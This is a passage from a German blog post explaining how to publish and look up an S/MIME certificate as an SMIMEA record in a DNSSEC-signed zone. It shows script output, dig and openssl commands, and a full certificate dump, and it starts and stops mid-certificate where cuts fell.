2d:5d:49:42:b9:a8:aa:84:e2:e6:3c:e9:b8:43:c1:\n                    66:5c:01:4a:65:72:a4:2e:37:6e:d0:62:96:94:fc:\n                    c9:42:fe:53:d7:60:52:a4:0c:da:b1:25:7a:1d:50:\n                    1d:9c:65:de:18:f2:7c:54:90:a2:41:81:49:8a:20:\n                    2e:56:f4:dc:0f:dc:bf:e9:47:66:f9:6e:bf:47:c8:\n                    72:37:44:ab:d6:9d:c6:84:41:71:06:df:3d:4f:12:\n                    fd:52:a1:3b:78:64:90:36:6d:bf:6c:b5:a8:43:62:\n                    1c:d6:86:b0:6d:07:2f:d7:d4:86:bd:0a:c7:06:02:\n                    1d:13:7a:36:57:18:dc:d8:70:9d:55:b6:44:28:f8:\n                    db:56:b2:68:bd:be:d4:63:a2:52:31:b4:05:66:c0:\n                    41:a4:89:58:be:17:67:e2:7e:21:88:1d:21:09:93:\n                    5c:02:f2:7e:a3:06:b6:49:97:68:3e:ef:df:86:85:\n                    f4:f0:90:ab:09:69:2f:23:2c:d3:4a:c7:ff:22:96:\n                    76:8c:ed:62:c6:8c:37:b4:c3:dd:9f:04:ec:9f:5c:\n                    9b:b9:f7:12:a5:03:2a:c2:f8:3d:68:da:75:6e:4f:\n                    28:86:a6:f6:58:89:cf:ae:a0:c1:5e:36:24:ea:3d:\n                    9e:3e:ff:91:d6:86:06:f7:b7:b1:b7:12:00:35:ad:\n                    4f:71:36:9e:6d:79:97:7b:4b:2c:c3:57:5a:c5:1c:\n                    af:41:9e:79:5b:78:82:2d:d3:6b:6d:0b:0e:46:22:\n                    bc:e5:5f:7b:27:fc:b5:2f:dc:d6:a4:fb:d3:3e:f0:\n                    9f:89:7c:ad:a2:e7:93:d1:50:9d:e5:47:73:b3:fb:\n                    e9:09:1c:ea:2e:27:a4:1c:ba:38:a0:8b:bb:e1:b1:\n                    5b:f5:6e:b3:5b:21:d6:6f:5b:1b:1c:c6:fd:d6:36:\n                    2a:a8:8a:40:10:f3:d2:73:2f:07:1a:84:1b:c7:65:\n                    d6:f7:4c:3b:43:0d:03:6a:32:79:18:d0:81:56:ba:\n                    28:82:d7:81:13:dd:15:63:35:99:31:9f:4b:d5:d4:\n                    f1:2e:1f:01:02:ba:33:76:6a:df:09:dc:58:32:32:\n                    46:d2:0b:ac:81:5b:e5:b8:82:2c:26:0e:fb:b0:7a:\n                    db:ab:98:fa:42:f3:16:50:fe:fa:e5:d6:79:d4:ad:\n                    29:99:2f:19:9d:59:f3:8d:54:98:8d:77:b6:1e:74:\n                    0c:bf:47\n                Exponent: 65537 (0x10001)\n        X509v3 extensions:\n            X509v3 Basic Constraints: critical\n                CA:FALSE\n            X509v3 CRL Distribution Points: \n                Full Name:\n                  URI:http://csmimersaca.crl.certum.pl/csmimersaca.crl\n            Authority Information Access: \n                OCSP - URI:http://csmimersaca.ocsp-certum.com\n                CA Issuers - URI:http://csmimersaca.repository.certum.pl/csmimersaca.cer\n            X509v3 Authority Key Identifier: \n                66:FB:C3:0F:BE:F4:BF:E0:9C:C9:AB:4D:DE:47:19:BD:C0:CA:A6:68\n            X509v3 Subject Key Identifier: \n                8D:8C:10:2E:11:D8:70:04:F7:DD:B4:E0:4F:F0:17:81:88:8A:32:A0\n            X509v3 Certificate Policies: \n                Policy: 2.23.140.1.5.4.2\n                Policy: 1.2.616.1.113527.2.100.1.1\n                  CPS: https://www.certum.pl/CPS\n            X509v3 Extended Key Usage: \n                E-mail Protection, TLS Web Client Authentication\n            X509v3 Key Usage: critical\n                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment\n            X509v3 Subject Alternative Name: \n                email:kernel-error@kernel-error.com\n    Signature Algorithm: sha256WithRSAEncryption\n    Signature Value:\n        70:72:47:99:f0:5c:f4:c8:21:85:4f:43:bd:95:0b:b6:08:b9:\n        89:04:63:49:21:4f:9d:0e:ec:79:f7:3a:59:db:f4:06:36:08:\n        fe:5a:7a:7f:a5:0c:d4:6a:15:48:60:18:eb:9c:33:44:18:08:\n        4d:8f:97:fe:32:ea:21:cc:ba:fe:90:2b:f6:47:2d:b6:ca:60:\n        d7:9e:be:09:91:9a:fa:06:52:d9:2c:b1:3b:50:64:00:ba:f4:\n        77:4f:32:63:96:7a:49:54:8a:6f:72:3a:dc:bb:71:5a:f7:97:\n        05:09:9e:5e:c8:4e:28:3d:af:a3:46:59:08:f4:14:8c:2b:15:\n        3c:41:d0:51:c9:42:95:d4:f0:42:54:21:7d:1c:8e:48:df:59:\n        d9:2e:cb:cb:4a:87:2e:c7:28:a9:54:da:f7:b6:61:de:80:37:\n        f7:f1:03:39:36:12:14:16:39:01:ac:fe:98:f3:d5:97:a6:7d:\n        be:87:a8:ee:1f:ec:33:db:71:71:2f:49:07:e0:f3:b1:17:1e:\n        91:76:15:81:89:ac:82:29:b2:6b:36:9c:0f:e2:bb:d5:96:4c:\n        a2:ab:fc:7d:95:54:85:05:61:02:84:4e:84:e8:f7:9e:0f:30:\n        bf:41:d5:f4:2b:3c:4f:4c:ca:9b:f9:33:4d:57:28:51:84:73:\n        a0:e6:1a:3a:fc:88:f5:90:34:f2:71:54:6b:5d:80:6d:86:f1:\n        e8:bc:6b:54:b4:e0:5f:80:c4:48:35:dc:c2:c5:34:e4:19:f6:\n        3b:bf:db:30:5c:17:33:b4:2d:d2:cc:57:95:87:6f:00:4f:18:\n        c2:e4:d6:4b:2c:9f:c6:93:95:90:be:32:50:1b:6a:6c:ed:b1:\n        9b:5f:bf:47:88:7c:76:e1:4c:99:a3:6d:46:e9:9b:5c:76:78:\n        2e:4e:34:5e:cb:37:e8:88:63:03:c8:48:49:ad:c8:bd:e1:af:\n        4e:3a:80:96:ae:e4:07:a4:06:99:d5:c0:00:ad:cd:16:a4:80:\n        5d:df:8f:b2:08:ff:b9:02:ef:14:03:1c:ff:be:3c:0d:c0:35:\n        88:eb:f1:55:57:b3:b1:02:9b:2c:d1:96:06:4b:c0:de:e1:f1:\n        1d:12:39:18:25:b8:6c:b3:4a:6f:be:bb:ad:43:b0:fe:0e:a4:\n        33:01:f9:3d:0b:26:ac:ed:18:2b:1e:27:06:3a:e5:78:c0:03:\n        d4:d4:49:81:32:b8:d9:80:53:27:54:cf:fb:d9:e6:d8:91:76:\n        15:b6:2a:e0:82:95:fc:46:39:1a:a0:fd:98:15:fd:d8:22:d9:\n        5e:9b:75:73:ca:35:47:7d:59:b9:8d:e4:85:20:65:f5:8f:b6:\n        0e:0e:62:0d:3e:2f:5c:ad\n</pre>\n\n\n\n<p>Beide Skripte findet ihr auf <strong><a href=\"https://github.com/Kernel-Error/smimea-tools\" data-type=\"link\" data-id=\"https://github.com/Kernel-Error/smimea-tools\" target=\"_blank\" rel=\"noreferrer noopener\">GitHub</a></strong>, damit ihr sie nutzen oder verbessern könnt.</p>\n\n\n\n<p>Warum habe ich geschrieben, dass ich nichts Zuverlässiges finden konnte? Nun, oft stoße ich auf Anleitungen, die noch auf TYPE53 basieren. Das ist nötig, wenn Bind9 den eigentlichen RR-Type noch nicht kennt – also ein klares Zeichen dafür, dass es sich um eine sehr frühe Implementierung handelt.</p>\n\n\n\n<p>Ein weiteres häufiges Problem: Der Hash des Local-Parts wird einfach weggelassen. Stattdessen erfolgen die Abfragen direkt auf _smimecert., was aber falsch ist. Ohne den SHA256-Hash des Local-Parts gibt es keine eindeutige Zuordnung zur jeweiligen E-Mail-Adresse.</p>\n\n\n\n<p>Warum ist der SMIMEA-DNS-Record so aufgebaut? Ganz einfach:</p>\n\n\n\n<p>Der erste Teil, also , sorgt dafür, dass nicht einfach jeder direkt aus der DNS-Zone die E-Mail-Adressen auslesen kann. Statt die E-Mail-Adresse im Klartext zu speichern, wird stattdessen nur der SHA256-Hash des Local-Parts (also der Teil vor dem @) genutzt. Das bedeutet: Wer die genaue E-Mail-Adresse kennt, kann den passenden DNS-Eintrag finden – aber jemand, der einfach nur blind durch die Zone scannt, sieht nur Hashes und kann damit nichts anfangen.</p>\n\n\n\n<p>Der _smimecert-Prefix zeigt an, dass es sich um einen SMIMEA-Record handelt, ähnlich wie es bei ._tcp. für SRV-Records oder _acme-challenge. für Let&#8217;s Encrypt-Zertifikate der Fall ist.</p>\n\n\n\n<p>Und schließlich kommt die Domain, zu der die E-Mail-Adresse gehört.</p>\n\n\n\n<p>Zusammen ergibt das einen sicheren, einfach abfragbaren und nicht direkt durchsuchbaren DNS-Eintrag für dein S/MIME-Zertifikat.</p>\n\n\n\n<p>Möchte man die Abfrage manuell mit dig für die E-Mail-Adresse „kernel-error@kernel-error.com“ durchführen, muss man zuerst den Local-Part der E-Mail-Adresse (kernel-error) mit SHA256 hashen. Laut RFC 8162, Abschnitt 3.1 wird der SHA-256-Hash auf die ersten 28 Bytes (56 Hex-Zeichen) gekürzt, um die DNS-Label-Längenbeschränkung von 63 Zeichen pro Label (RFC 1035, Abschnitt 2.3.4) einzuhalten.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"bash\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">echo -n \"kernel-error\" | sha256sum | awk '{print $1}' | cut -c1-56\n70e1c7d87e825b3aba45e2a478025ea0d91d298038436abde5a4c2d0</pre>\n\n\n\n<p>Anschließend kann man die dig-Abfrage korrekt zusammensetzen:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"bash\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">dig +dnssec +short 70e1c7d87e825b3aba45e2a478025ea0d91d298038436abde5a4c2d0._smimecert.kernel-error.com. SMIMEA\n3 0 0 30820714308204FCA003020102021073C13C478DA7B114B871F00737 F1B0FB300D06092A864886F70D01010B0500304E310B300906035504 061302504C3121301F060355040A0C1841737365636F204461746120 53797374656D7320532E412E311C301A06035504030C134365727475 6D20534D494D4520525341204341301E170D32353033313331333431 35355A170D3237303331333133343135345A30783114301206035504 040C0B76616E206465204D65657231123010060355042A0C09536562 61737469616E311E301C06035504030C1553656261737469616E2076 616E206465204D656572312C302A06092A864886F70D010901161D6B 65726E656C2D6572726F72406B65726E656C2D6572726F722E636F6D 30820222300D06092A864886F70D01010105000382020F003082020A 0282020100D0A90BC53ABA0408543FE600F0F71C17BE7EB4A8996A8E F5E9122AAC8E7F39D627186617C4D6CA734E1A9E6302F8076065EA93 D762542D2C12BFF32D5D4942B9A8AA84E2E63CE9B843C1665C014A65 72A42E376ED0629694FCC942FE53D76052A40CDAB1257A1D501D9C65 DE18F27C5490A24181498A202E56F4DC0FDCBFE94766F96EBF47C872 3744ABD69DC684417106DF3D4F12FD52A13B786490366DBF6CB5A843 621CD686B06D072FD7D486BD0AC706021D137A365718DCD8709D55B6 4428F8DB56B268BDBED463A25231B40566C041A48958BE1767E27E21 881D2109935C02F27EA306B64997683EEFDF8685F4F090AB09692F23 2CD34AC7FF2296768CED62C68C37B4C3DD9F04EC9F5C9BB9F712A503 2AC2F83D68DA756E4F2886A6F65889CFAEA0C15E3624EA3D9E3EFF91 D68606F7B7B1B7120035AD4F71369E6D79977B4B2CC3575AC51CAF41 9E795B78822DD36B6D0B0E4622BCE55F7B27FCB52FDCD6A4FBD33EF0 9F897CADA2E793D1509DE54773B3FBE9091CEA2E27A41CBA38A08BBB E1B15BF56EB35B21D66F5B1B1CC6FDD6362AA88A4010F3D2732F071A 841BC765D6F74C3B430D036A327918D08156BA2882D78113DD156335 99319F4BD5D4F12E1F0102BA33766ADF09DC58323246D20BAC815BE5 B8822C260EFBB07ADBAB98FA42F31650FEFAE5D679D4AD29992F199D 59F38D54988D77B61E740CBF470203010001A38201C2308201BE300C 0603551D130101FF0402300030410603551D1F043A30383036A034A0 328630687474703A2F2F63736D696D6572736163612E63726C2E6365 7274756D2E706C2F63736D696D6572736163612E63726C3081830608 2B0601050507010104773075302E06082B0601050507300186226874 74703A2F2F63736D696D6572736163612E6F6373702D63657274756D 2E636F6D304306082B060105050730028637687474703A2F2F63736D 696D6572736163612E7265706F7369746F72792E63657274756D2E70 6C2F63736D696D6572736163612E636572301F0603551D2304183016 801466FBC30FBEF4BFE09CC9AB4DDE4719BDC0CAA668301D0603551D 0E041604148D8C102E11D87004F7DDB4E04FF01781888A32A0304C06 03551D20044530433009060767810C010504023036060B2A84680186 F677026401013027302506082B06010505070201161968747470733A 2F2F7777772E63657274756D2E706C2F435053301D0603551D250416 301406082B0601050507030406082B06010505070302300E0603551D 0F0101FF0404030204F030280603551D110421301F811D6B65726E65 6C2D6572726F72406B65726E656C2D6572726F722E636F6D300D0609 2A864886F70D01010B0500038202010070724799F05CF4C821854F43 BD950BB608B989046349214F9D0EEC79F73A59DBF4063608FE5A7A7F A50CD46A15486018EB9C334418084D8F97FE32EA21CCBAFE902BF647 2DB6CA60D79EBE09919AFA0652D92CB13B506400BAF4774F3263967A 49548A6F723ADCBB715AF79705099E5EC84E283DAFA3465908F4148C 2B153C41D051C94295D4F04254217D1C8E48DF59D92ECBCB4A872EC7 28A954DAF7B661DE8037F7F10339361214163901ACFE98F3D597A67D BE87A8EE1FEC33DB71712F4907E0F3B1171E9176158189AC8229B26B 369C0FE2BBD5964CA2ABFC7D955485056102844E84E8F79E0F30BF41 D5F42B3C4F4CCA9BF9334D5728518473A0E61A3AFC88F59034F27154 6B5D806D86F1E8BC6B54B4E05F80C44835DCC2C534E419F63BBFDB30 5C1733B42DD2CC5795876F004F18C2E4D64B2C9FC6939590BE32501B 6A6CEDB19B5FBF47887C76E14C99A36D46E99B5C76782E4E345ECB37 E8886303C84849ADC8BDE1AF4E3A8096AEE407A40699D5C000ADCD16 A4805DDF8FB208FFB902EF14031CFFBE3C0DC03588EBF15557B3B102 9B2CD196064BC0DEE1F11D12391825B86CB34A6FBEBBAD43B0FE0EA4 3301F93D0B26ACED182B1E27063AE578C003D4D4498132B8D9805327 54CFFBD9E6D8917615B62AE08295FC46391AA0FD9815FDD822D95E9B 7573CA35477D59B98DE4852065F58FB60E0E620D3E2F5CAD\n</pre>\n\n\n\n<p><strong>Was bedeutet das?</strong><br>3 → Gibt an, dass es sich um einen S/MIMEA-Record handelt. Die Zahl steht für den sogenannten &#8222;Usage&#8220;-Wert, also wie das Zertifikat genutzt wird. In diesem Fall bedeutet 3, dass es für eine End-Entity-Zertifizierung gedacht ist, also für die tatsächliche E-Mail-Verschlüsselung und Signatur.<br><br>0 → Der &#8222;Selector&#8220;-Wert. Hier steht 0, was bedeutet, dass der gesamte Public Key aus dem Zertifikat gespeichert wird. Alternativ könnte 1 stehen, dann wäre nur der &#8222;Subject Public Key Info&#8220;-Teil enthalten.<br><br>0 → Gibt an, welche Hash-Funktion verwendet wird. Ist es 1, steht es für SHA-256 steht. Alternativ könnte 2 für SHA-512 verwendet werden oder, wie in unserem Fall 0, was für das komplette Zertifikat steht.<br><br>Hexwerte → Das ist der eigentliche Zertifikatsinhalt, also der öffentliche Schlüssel in hexadezimaler Darstellung.</p>\n\n\n\n<p>Möchte man den kompletten DNS-Record einmal manuell auf der Konsole prüfen, geht das wie folgt:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"bash\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">dig +short 70e1c7d87e825b3aba45e2a478025ea0d91d298038436abde5a4c2d0._smimecert.kernel-error.com SMIMEA | sed 's/^3 0 0 //' | tr -d '[:space:]' > dns_cert.hex</pre>\n\n\n\n<p>Damit holen wir uns den SMIMEA-Eintrag, entfernen die vorderen 3 0 0, da diese nur die Nutzungsparameter angeben, und speichern den reinen HEX-Wert in eine Datei.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"bash\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">xxd -r -p dns_cert.hex dns_cert.der</pre>\n\n\n\n<p>Hier wandeln wir den HEX-String in eine binäre DER-Datei um.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"bash\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">openssl x509 -inform DER -in dns_cert.der -text -noout</pre>\n\n\n\n<p>So kann man sich das Zertifikat im lesbaren Format anzeigen lassen.</p>\n\n\n\n<p><strong>Und nun?</strong></p>\n\n\n\n<p>SMIMEA ist leider noch immer nicht besonders weit verbreitet. Das liegt sicherlich daran, dass das RFC noch immer experimental ist, aber auch daran, dass es auf weiteren Techniken aufbaut, die ebenfalls eher selten genutzt werden. So braucht man SMIMEA nur, wenn man überhaupt selbst ein S/MIME-Zertifikat zur Signatur und Verschlüsselung von E-Mails verwendet. Zusätzlich muss die Domain per DNSSEC geschützt sein – was noch weniger verbreitet ist – und dann muss auch noch der zusätzliche Mehrwert von SMIMEA verstanden werden.</p>\n\n\n\n<p>Denn SMIMEA verteilt nicht nur die Zertifikate, sondern macht einen direkt initial verschlüsselt erreichbar. Wenn man der Empfänger einer solchen signierten Nachricht ist, kann man das Zertifikat zudem gegen eine vertrauenswürdige DNS-Zone halten und sich so vergewissern, dass es wirklich die Signatur des Absenders ist – ähnlich wie bei TLSA/DANE.</p>\n\n\n\n<p>Ihr kennt das doch mit der Sicherheit im Internet: Sie ist nur relevant, wenn man damit Geld verdienen kann oder wenn man Opfer geworden ist. Die Implementierung von SMIMEA ist also aktuell sehr überschaubar. Es gibt Milter für beispielsweise Postfix oder Plugins für Thunderbird, aber vor allem im Enterprise-Umfeld ist mir momentan keine funktionierende Lösung bekannt.</p>\n\n\n\n<p>Pffff… Eigentlich wollte ich doch nur schnell schreiben, dass ich da zwei Python-Skripte zusammengebastelt habe – und am Ende ist es doch wieder so ein riesiges Ding geworden. <img src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/1f605.png\" alt=\"😅\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n\n\n\n<p>Aber ich denke, vor allem der Teil mit dem gekürzten Hash des Local-Parts der E-Mail-Adresse ist wichtig zu erklären. Das ist echt eine verrückte Konstruktion. Klar, das hat seinen Sinn, aber zumindest ich bin damals genau an diesem Punkt hängen geblieben.</p>\n\n\n\n<p>Naja, jetzt könnt ihr die Skripte nutzen und euch den ganzen Fummel selbst auf der CLI anschauen, testen und vor allem auch verstehen.</p>\n\n\n\n<p>Viel Spaß! <img src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/1f603.png\" alt=\"😃\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\"/>\n\n\n\n<p>B.t.w.: Das einzig korrekt funktionierende online Tool, was ich finden konnte ist: <a href=\"https://www.co.tt/smimea.cgi\" target=\"_blank\" rel=\"noreferrer noopener\">https://www.co.tt/smimea.cgi</a></p>\n\n\n\n<p>Alle anderen sind nicht erreichbar, halten sich nicht ans RFC oder ich war zu blöde, sie zu bedienen.</p>\n\n\n\n<p></p>\n",
    "sanitized": "Mal wieder soweit: Mein aktuelles S/MIME-Zertifikat zum Signieren von E-Mails läuft aus. Also habe ich mir ein neues besorgt. Da GlobalSign keine Class-2-Zertifikate mehr für Privatpersonen anbietet, musste ich die CA wechseln. Durch Zufall bin ich auf SSLplus gestoßen – die haben echt gute Angebote für alle möglichen Zertifikate. Aber darum soll es in diesem Beitrag nicht gehen.\n\n\n\nWie immer will ich mein Zertifikat öffentlich zugänglich machen, sonst müsste jeder erst eine von mir signierte E-Mail erhalten, bevor er mein Zertifikat hat. Erst dann könnten Absender mir verschlüsselte E-Mails schicken.\n\n\n\nDafür gibt es ein experimentelles RFC 8162, das beschreibt, wie sich ein solches Zertifikat in einer DNSSEC-geschützten Zone veröffentlichen lässt. Natürlich gibt es im Internet wieder zig verschiedene Anleitungen und Wege, um das zu realisieren. Aber nichts wirklich Zuverlässiges, was ich finden konnte. Den DNS-Record für meine Bind9-Zone wieder manuell zu erstellen, hatte ich jedenfalls keine Lust.\n\n\n\nAlso habe ich zwei kleine Python3-Skripte geschrieben:\n\n\n\nsmimea_generate_record.py – Erstellt einen kopierbaren RR für die DNS-Zone. Kann interaktiv genutzt werden: Fragt nach E-Mail-Adresse und PEM-Zertifikat. Oder direkt mit Parametern aufgerufen werden. Prüft, ob E-Mail-Adresse und Zertifikat zusammenpassen, und gibt den fertigen Record aus.\n\n\n\n./smimea_generate_record.py\nEnter the email address: kernel-error@kernel-error.com\nEnter the path to the PEM certificate: mail.pem\n Email 'kernel-error@kernel-error.com' matches the certificate!\n\n **Generated BIND9 DNS Record:**\n\n70e1c7d87e825b3aba45e2a478025ea0d91d298038436abde5a4c2d0._smimecert.kernel-error.com. 3600 IN SMIMEA 3 0 0 (\n   30820714308204FCA003020102021073C13C478DA7B114B871F00737F1B0FB30\n   0D06092A864886F70D01010B0500304E310B300906035504061302504C312130\n   1F060355040A0C1841737365636F20446174612053797374656D7320532E412E\n   311C301A06035504030C1343657274756D20534D494D4520525341204341301E\n   170D3235303331333133343135355A170D3237303331333133343135345A3078\n   3114301206035504040C0B76616E206465204D65657231123010060355042A0C\n   0953656261737469616E311E301C06035504030C1553656261737469616E2076\n   616E206465204D656572312C302A06092A864886F70D010901161D6B65726E65\n   6C2D6572726F72406B65726E656C2D6572726F722E636F6D30820222300D0609\n   2A864886F70D01010105000382020F003082020A0282020100D0A90BC53ABA04\n   08543FE600F0F71C17BE7EB4A8996A8EF5E9122AAC8E7F39D627186617C4D6CA\n   734E1A9E6302F8076065EA93D762542D2C12BFF32D5D4942B9A8AA84E2E63CE9\n   B843C1665C014A6572A42E376ED0629694FCC942FE53D76052A40CDAB1257A1D\n   501D9C65DE18F27C5490A24181498A202E56F4DC0FDCBFE94766F96EBF47C872\n   3744ABD69DC684417106DF3D4F12FD52A13B786490366DBF6CB5A843621CD686\n   B06D072FD7D486BD0AC706021D137A365718DCD8709D55B64428F8DB56B268BD\n   BED463A25231B40566C041A48958BE1767E27E21881D2109935C02F27EA306B6\n   4997683EEFDF8685F4F090AB09692F232CD34AC7FF2296768CED62C68C37B4C3\n   DD9F04EC9F5C9BB9F712A5032AC2F83D68DA756E4F2886A6F65889CFAEA0C15E\n   3624EA3D9E3EFF91D68606F7B7B1B7120035AD4F71369E6D79977B4B2CC3575A\n   C51CAF419E795B78822DD36B6D0B0E4622BCE55F7B27FCB52FDCD6A4FBD33EF0\n   9F897CADA2E793D1509DE54773B3FBE9091CEA2E27A41CBA38A08BBBE1B15BF5\n   6EB35B21D66F5B1B1CC6FDD6362AA88A4010F3D2732F071A841BC765D6F74C3B\n   430D036A327918D08156BA2882D78113DD15633599319F4BD5D4F12E1F0102BA\n   33766ADF09DC58323246D20BAC815BE5B8822C260EFBB07ADBAB98FA42F31650\n   FEFAE5D679D4AD29992F199D59F38D54988D77B61E740CBF470203010001A382\n   01C2308201BE300C0603551D130101FF0402300030410603551D1F043A303830\n   36A034A0328630687474703A2F2F63736D696D6572736163612E63726C2E6365\n   7274756D2E706C2F63736D696D6572736163612E63726C30818306082B060105\n   0507010104773075302E06082B060105050730018622687474703A2F2F63736D\n   696D6572736163612E6F6373702D63657274756D2E636F6D304306082B060105\n   050730028637687474703A2F2F63736D696D6572736163612E7265706F736974\n   6F72792E63657274756D2E706C2F63736D696D6572736163612E636572301F06\n   03551D2304183016801466FBC30FBEF4BFE09CC9AB4DDE4719BDC0CAA668301D\n   0603551D0E041604148D8C102E11D87004F7DDB4E04FF01781888A32A0304C06\n   03551D20044530433009060767810C010504023036060B2A84680186F6770264\n   01013027302506082B06010505070201161968747470733A2F2F7777772E6365\n   7274756D2E706C2F435053301D0603551D250416301406082B06010505070304\n   06082B06010505070302300E0603551D0F0101FF0404030204F030280603551D\n   110421301F811D6B65726E656C2D6572726F72406B65726E656C2D6572726F72\n   2E636F6D300D06092A864886F70D01010B0500038202010070724799F05CF4C8\n   21854F43BD950BB608B989046349214F9D0EEC79F73A59DBF4063608FE5A7A7F\n   A50CD46A15486018EB9C334418084D8F97FE32EA21CCBAFE902BF6472DB6CA60\n   D79EBE09919AFA0652D92CB13B506400BAF4774F3263967A49548A6F723ADCBB\n   715AF79705099E5EC84E283DAFA3465908F4148C2B153C41D051C94295D4F042\n   54217D1C8E48DF59D92ECBCB4A872EC728A954DAF7B661DE8037F7F103393612\n   14163901ACFE98F3D597A67DBE87A8EE1FEC33DB71712F4907E0F3B1171E9176\n   158189AC8229B26B369C0FE2BBD5964CA2ABFC7D955485056102844E84E8F79E\n   0F30BF41D5F42B3C4F4CCA9BF9334D5728518473A0E61A3AFC88F59034F27154\n   6B5D806D86F1E8BC6B54B4E05F80C44835DCC2C534E419F63BBFDB305C1733B4\n   2DD2CC5795876F004F18C2E4D64B2C9FC6939590BE32501B6A6CEDB19B5FBF47\n   887C76E14C99A36D46E99B5C76782E4E345ECB37E8886303C84849ADC8BDE1AF\n   4E3A8096AEE407A40699D5C000ADCD16A4805DDF8FB208FFB902EF14031CFFBE\n   3C0DC03588EBF15557B3B1029B2CD196064BC0DEE1F11D12391825B86CB34A6F\n   BEBBAD43B0FE0EA43301F93D0B26ACED182B1E27063AE578C003D4D4498132B8\n   D980532754CFFBD9E6D8917615B62AE08295FC46391AA0FD9815FDD822D95E9B\n   7573CA35477D59B98DE4852065F58FB60E0E620D3E2F5CAD\n   )\n\n\n\n\nsmimea_lookup.py – Fragt den SMIMEA-Record im DNS ab, lädt das Zertifikat herunter und prüft es mit OpenSSL auf Gültigkeit. Funktioniert interaktiv oder mit übergebenen Werten.\n\n\n\n./smimea_lookup.py \nEnter the email address: kernel-error@kernel-error.com\n\nQuerying DNS for SMIMEA record:\n  70e1c7d87e825b3aba45e2a478025ea0d91d298038436abde5a4c2d0._smimecert.kernel-error.com\n\nCertificate saved as smimea_cert.der\nCertificate successfully retrieved and verified:\n\nCertificate:\n    Data:\n        Version: 3 (0x2)\n        Serial Number:\n            73:c1:3c:47:8d:a7:b1:14:b8:71:f0:07:37:f1:b0:fb\n        Signature Algorithm: sha256WithRSAEncryption\n        Issuer: C = PL, O = Asseco Data Systems S.A., CN = Certum SMIME RSA CA\n        Validity\n            Not Before: Mar 13 13:41:55 2025 GMT\n            Not After : Mar 13 13:41:54 2027 GMT\n        Subject: SN = van de Meer, GN = Sebastian, CN = Sebastian van de Meer, emailAddress = kernel-error@kernel-error.com\n        Subject Public Key Info:\n            Public Key Algorithm: rsaEncryption\n                Public-Key: (4096 bit)\n                Modulus:\n                    00:d0:a9:0b:c5:3a:ba:04:08:54:3f:e6:00:f0:f7:\n                    1c:17:be:7e:b4:a8:99:6a:8e:f5:e9:12:2a:ac:8e:\n                    7f:39:d6:27:18:66:17:c4:d6:ca:73:4e:1a:9e:63:\n                    02:f8:07:60:65:ea:93:d7:62:54:2d:2c:12:bf:f3:\n                    2d:5d:49:42:b9:a8:aa:84:e2:e6:3c:e9:b8:43:c1:\n                    66:5c:01:4a:65:72:a4:2e:37:6e:d0:62:96:94:fc:\n                    c9:42:fe:53:d7:60:52:a4:0c:da:b1:25:7a:1d:50:\n                    1d:9c:65:de:18:f2:7c:54:90:a2:41:81:49:8a:20:\n                    2e:56:f4:dc:0f:dc:bf:e9:47:66:f9:6e:bf:47:c8:\n                    72:37:44:ab:d6:9d:c6:84:41:71:06:df:3d:4f:12:\n                    fd:52:a1:3b:78:64:90:36:6d:bf:6c:b5:a8:43:62:\n                    1c:d6:86:b0:6d:07:2f:d7:d4:86:bd:0a:c7:06:02:\n                    1d:13:7a:36:57:18:dc:d8:70:9d:55:b6:44:28:f8:\n                    db:56:b2:68:bd:be:d4:63:a2:52:31:b4:05:66:c0:\n                    41:a4:89:58:be:17:67:e2:7e:21:88:1d:21:09:93:\n                    5c:02:f2:7e:a3:06:b6:49:97:68:3e:ef:df:86:85:\n                    f4:f0:90:ab:09:69:2f:23:2c:d3:4a:c7:ff:22:96:\n                    76:8c:ed:62:c6:8c:37:b4:c3:dd:9f:04:ec:9f:5c:\n                    9b:b9:f7:12:a5:03:2a:c2:f8:3d:68:da:75:6e:4f:\n                    28:86:a6:f6:58:89:cf:ae:a0:c1:5e:36:24:ea:3d:\n                    9e:3e:ff:91:d6:86:06:f7:b7:b1:b7:12:00:35:ad:\n                    4f:71:36:9e:6d:79:97:7b:4b:2c:c3:57:5a:c5:1c:\n                    af:41:9e:79:5b:78:82:2d:d3:6b:6d:0b:0e:46:22:\n                    bc:e5:5f:7b:27:fc:b5:2f:dc:d6:a4:fb:d3:3e:f0:\n                    9f:89:7c:ad:a2:e7:93:d1:50:9d:e5:47:73:b3:fb:\n                    e9:09:1c:ea:2e:27:a4:1c:ba:38:a0:8b:bb:e1:b1:\n                    5b:f5:6e:b3:5b:21:d6:6f:5b:1b:1c:c6:fd:d6:36:\n                    2a:a8:8a:40:10:f3:d2:73:2f:07:1a:84:1b:c7:65:\n                    d6:f7:4c:3b:43:0d:03:6a:32:79:18:d0:81:56:ba:\n                    28:82:d7:81:13:dd:15:63:35:99:31:9f:4b:d5:d4:\n                    f1:2e:1f:01:02:ba:33:76:6a:df:09:dc:58:32:32:\n                    46:d2:0b:ac:81:5b:e5:b8:82:2c:26:0e:fb:b0:7a:\n                    db:ab:98:fa:42:f3:16:50:fe:fa:e5:d6:79:d4:ad:\n                    